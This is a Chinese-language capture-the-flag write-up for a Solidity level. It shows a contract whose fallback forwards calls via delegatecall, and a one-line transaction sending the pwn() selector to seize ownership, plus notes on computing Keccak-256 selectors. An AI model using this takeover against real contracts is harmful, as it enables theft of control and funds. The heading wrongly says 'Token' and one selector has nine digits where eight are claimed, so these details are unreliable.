# 05 - Token writeup

## 题目

这一关的目标是申明你对你创建实例的所有权
题目如下:
```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```

## 解题
很显然，我只需要用我的钱包发送交易到题目合约，激活 fallback() 函数即可。
发送交易的方式如下 `contract.sendTransaction({data:"dd365b8b"})  `

这里有几个难点：dd365b8b 是 “pwn()” 的 Keccak-256 处理后的hash 前8位 ，
可以用这个 [网站](https://emn178.github.io/online-tools/keccak_256.html) 来简单处理这类hash
这里要注意比如 increaseAllowance(address,uint256) 的前 8 位应该是 39509351d
但如果在上面网址输入 increaseAllowance(address spender, uint256 addedValue) 得到的结果是 85ef1fd4，是不对的,参数需要只留类型，中间只留逗号，不能有任何空格。

